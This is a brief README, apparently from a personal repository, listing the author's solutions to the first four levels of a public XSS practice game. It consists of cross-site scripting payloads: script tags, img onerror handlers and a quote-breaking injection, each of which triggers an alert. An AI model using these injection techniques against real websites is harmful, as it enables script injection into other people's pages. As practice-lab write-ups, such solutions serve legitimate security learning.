# Game-xss
My solutions for https://xss-game.appspot.com

##Step 1
```javascript
<script>alert(1);</script>
```
##Step 2
```html
<img src="forbidden" onerror="alert('1')" />
```
##Step 3
Replace
```html
<img src="/static/level3/cloud3.jpg">
```
to
```html
<img src="/static/level3/#6.jpg" onerror="alert(1)">
```
##Step 4
```javascript
1');alert('1
```
